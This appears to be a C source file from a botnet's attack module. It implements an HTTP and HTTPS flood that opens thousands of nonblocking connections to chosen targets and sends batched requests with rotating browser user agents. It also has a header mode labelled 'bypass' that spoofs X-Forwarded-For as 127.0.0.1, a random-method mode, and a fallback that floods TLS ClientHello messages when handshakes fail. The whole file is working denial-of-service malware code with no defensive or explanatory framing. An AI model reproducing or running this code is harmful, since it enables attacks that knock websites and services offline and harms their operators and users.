#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <arpa/inet.h>
#include <poll.h>
#include <sys/socket.h>
#include <time.h>

#include "headers/includes.h"
#include "headers/attack.h"
#include "headers/tls_bomb.h"
#include "headers/tls_client.h"
#include "headers/rand.h"

#define MAX_CONNS   4096
#define REQ_BATCH   5
#define REQ_LIMIT   1000
#define HTTP_STATE_TLS      0
#define HTTP_STATE_TLS_SEND 1
#define HTTP_STATE_TLS_FLOOD 2
#define HTTP_STATE_SEND     3

const char *user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
    NULL
};

const char *accepts[] = {
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "*/*",
    NULL
};

const char *languages[] = {
    "en-US,en;q=0.9",
    "en;q=0.8",
    NULL
};

const char *connections[] = {
    "keep-alive",
    "close",
    NULL
};

const char *http_methods[] = {
    "GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", NULL
};

#define HDR_COUNT(a) (sizeof(a)/sizeof(a[0]) - 1)

static int set_nonblocking(int fd)
{
    return fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);
}

static int try_connect(struct attack_target *targ, int port)
{
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    int err;
    socklen_t el;
    struct pollfd pfd;

    if (sock < 0)
        return -1;

    set_nonblocking(sock);
    targ->sock_addr.sin_port = htons(port);
    connect(sock, (struct sockaddr *)&targ->sock_addr, sizeof(struct sockaddr_in));

    pfd.fd = sock;
    pfd.events = POLLOUT;
    if (poll(&pfd, 1, 2000) <= 0) {
        close(sock);
        return -1;
    }

    el = sizeof(err);
    if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &err, &el) < 0 || err) {
        close(sock);
        return -1;
    }
    return sock;
}

static int build_request(char *buf, size_t bufsz,
                         const char *method, const char *path,
                         const char *domain, const char *postdata,
                         int mode)
{
    const char *ua   = user_agents[rand_next() % HDR_COUNT(user_agents)];
    const char *acc  = accepts[rand_next() % HDR_COUNT(accepts)];
    const char *lang = languages[rand_next() % HDR_COUNT(languages)];
    const char *conn = connections[rand_next() % HDR_COUNT(connections)];

    if (mode == HTTP_MODE_KEEPALIVE)     conn = "keep-alive";
    if (mode == HTTP_MODE_NORESPONSE)    conn = "close";

    if (postdata && strcmp(method, "POST") == 0)
    {
        return snprintf(buf, bufsz,
            "%s %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: %s\r\n"
            "Accept: %s\r\n"
            "Accept-Language: %s\r\n"
            "Connection: %s\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: %zu\r\n"
            "\r\n"
            "%s",
            method, path, domain, ua, acc, lang, conn,
            strlen(postdata), postdata);
    }
    else if (mode == HTTP_MODE_BYPASS)
    {
        return snprintf(buf, bufsz,
            "%s %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "X-Forwarded-For: 127.0.0.1\r\n"
            "X-Forwarded-Host: %s\r\n"
            "User-Agent: %s\r\n"
            "Connection: keep-alive\r\n"
            "\r\n",
            method, path, domain, domain, ua);
    }
    else
    {
        return snprintf(buf, bufsz,
            "%s %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: %s\r\n"
            "Accept: %s\r\n"
            "Accept-Language: %s\r\n"
            "Connection: %s\r\n"
            "\r\n",
            method, path, domain, ua, acc, lang, conn);
    }
}

static void http_reconnect(int i, int port, struct attack_target *targs, int *target_indices,
                           int *sockets, struct pollfd *pfds, int *req_counts, char *state,
                           tls_client_t *tls, int use_https)
{
    int t = target_indices[i];
    close(pfds[i].fd);
    sockets[i] = try_connect(&targs[t], port);
    pfds[i].fd = sockets[i];
    if (sockets[i] >= 0)
        pfds[i].events = POLLOUT;
    else
        pfds[i].fd = -1;
    req_counts[i] = 0;
    tls_client_reset(&tls[i]);
    state[i] = use_https ? HTTP_STATE_TLS : HTTP_STATE_SEND;
}

void attack_method_http(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
    char domain_buf[INET_ADDRSTRLEN];
    char parsed_domain[256] = {0};
    char *path = attack_get_opt_str(opts_len, opts, ATK_OPT_PATH, "/");
    int use_https = attack_get_opt_int(opts_len, opts, ATK_OPT_HTTPS, FALSE);
    int use_port  = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
    int mode      = attack_get_opt_int(opts_len, opts, ATK_OPT_MODE, HTTP_MODE_STANDARD);
    char *method  = attack_get_opt_str(opts_len, opts, ATK_OPT_METHOD, "GET");
    char *postdata = attack_get_opt_str(opts_len, opts, ATK_OPT_POST_DATA, NULL);
    int conns = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 100);
    int port, total_conns, i, s, ret;

    struct pollfd *pfds;
    int *sockets, *target_indices, *req_counts;
    char *state;
    tls_client_t *tls;

    if (domain == NULL)
    {
        if (targs_len == 0)
            return;
        if (!inet_ntop(AF_INET, &targs[0].sock_addr.sin_addr, domain_buf, sizeof(domain_buf)))
            return;
        domain = domain_buf;
    }

    if (path && (strncmp(path, "http://", 7) == 0 || strncmp(path, "https://", 8) == 0))
    {
        char *url = path;
        int is_https = (strncmp(url, "https://", 8) == 0);
        char *start_host = url + (is_https ? 8 : 7);
        char *end_host = strchr(start_host, '/');
        char *end_or_null = end_host ? end_host : (start_host + strlen(start_host));
        size_t host_len = end_or_null - start_host;

        if (host_len >= sizeof(parsed_domain))
            host_len = sizeof(parsed_domain) - 1;
        strncpy(parsed_domain, start_host, host_len);
        parsed_domain[host_len] = '\0';

        {
            char *colon = strchr(parsed_domain, ':');
            if (colon)
            {
                *colon = '\0';
                {
                    int parsed_port = atoi(colon + 1);
                    if (parsed_port > 0 && parsed_port <= 65535)
                        use_port = parsed_port;
                }
            }
        }

        if (parsed_domain[0] != '\0')
            domain = parsed_domain;
        path = end_host ? end_host : "/";
        if (is_https)
            use_https = TRUE;
    }

    if (use_https && use_port == 80)
        use_port = 443;
    port = use_port;

    total_conns = conns * targs_len;
    if (total_conns > MAX_CONNS)
        total_conns = MAX_CONNS;

    pfds = calloc(total_conns, sizeof(struct pollfd));
    sockets = calloc(total_conns, sizeof(int));
    target_indices = calloc(total_conns, sizeof(int));
    req_counts = calloc(total_conns, sizeof(int));
    state = calloc(total_conns, sizeof(char));
    tls = calloc(total_conns, sizeof(tls_client_t));

    if (!pfds || !sockets || !target_indices || !state || !req_counts || !tls)
        goto cleanup;

    for (i = 0, s = 0; i < targs_len; i++)
    {
        for (int j = 0; j < conns && s < total_conns; j++, s++)
        {
            target_indices[s] = i;
            sockets[s] = try_connect(&targs[i], port);
            if (sockets[s] < 0) {
                pfds[s].fd = -1;
                continue;
            }
            pfds[s].fd = sockets[s];
            pfds[s].events = POLLOUT;
            req_counts[s] = 0;
            tls_client_reset(&tls[s]);
            state[s] = use_https ? HTTP_STATE_TLS : HTTP_STATE_SEND;
        }
    }

    while (g_atk_end_time == 0 || time(NULL) < g_atk_end_time)
    {
        ret = poll(pfds, total_conns, 50);
        if (ret <= 0)
            continue;

        for (i = 0; i < total_conns; i++)
        {
            char req[4096];
            const char *use_method = method;
            int req_len;

            if (pfds[i].fd < 0)
                continue;

            if (pfds[i].revents & (POLLERR | POLLHUP | POLLNVAL))
            {
                http_reconnect(i, port, targs, target_indices, sockets, pfds, req_counts, state, tls, use_https);
                continue;
            }

            if (use_https && state[i] == HTTP_STATE_TLS && (pfds[i].revents & POLLOUT))
            {
                if (tls_client_handshake(&tls[i], pfds[i].fd, domain, 3000) == 0)
                    state[i] = HTTP_STATE_TLS_SEND;
                else
                    state[i] = HTTP_STATE_TLS_FLOOD;
                pfds[i].events = POLLOUT;
                continue;
            }

            if (use_https && state[i] == HTTP_STATE_TLS_FLOOD && (pfds[i].revents & POLLOUT))
            {
                uint8_t hello[4096];
                int hello_len = tls_build_client_hello(hello, domain, 0, NULL, NULL);
                send(pfds[i].fd, hello, hello_len, MSG_NOSIGNAL | MSG_DONTWAIT);
                {
                    char tlsbuf[512];
                    while (recv(pfds[i].fd, tlsbuf, sizeof(tlsbuf), MSG_DONTWAIT) > 0)
                        ;
                }
                pfds[i].events = POLLOUT;
                continue;
            }

            if (state[i] != HTTP_STATE_SEND && state[i] != HTTP_STATE_TLS_SEND)
                continue;

            if (!(pfds[i].revents & POLLOUT))
                continue;

            if (mode == HTTP_MODE_RANDOM)
                use_method = http_methods[rand_next() % HDR_COUNT(http_methods)];

            req_len = build_request(req, sizeof(req), use_method, path, domain, postdata, mode);

            for (int j = 0; j < REQ_BATCH && req_counts[i] < REQ_LIMIT; j++)
            {
                ssize_t sent;
                if (use_https && state[i] == HTTP_STATE_TLS_SEND)
                {
                    if (tls_client_send(&tls[i], pfds[i].fd, (uint8_t *)req, req_len) < 0)
                    {
                        http_reconnect(i, port, targs, target_indices, sockets, pfds, req_counts, state, tls, use_https);
                        break;
                    }
                    req_counts[i]++;
                    continue;
                }

                sent = send(pfds[i].fd, req, req_len, MSG_NOSIGNAL | MSG_DONTWAIT);
                if (sent <= 0)
                {
                    if (errno == EAGAIN || errno == EWOULDBLOCK)
                        continue;
                    http_reconnect(i, port, targs, target_indices, sockets, pfds, req_counts, state, tls, use_https);
                    break;
                }
                req_counts[i]++;
            }

            if (mode != HTTP_MODE_NORESPONSE)
            {
                char buf[1024];
                while (recv(pfds[i].fd, buf, sizeof(buf), MSG_DONTWAIT | MSG_TRUNC) > 0)
                    ;
            }

            if (req_counts[i] >= REQ_LIMIT)
                http_reconnect(i, port, targs, target_indices, sockets, pfds, req_counts, state, tls, use_https);
        }
    }

cleanup:
    for (i = 0; i < total_conns; i++)
        if (pfds && pfds[i].fd >= 0)
            close(pfds[i].fd);
    free(pfds);
    free(sockets);
    free(target_indices);
    free(state);
    free(req_counts);
    free(tls);
}
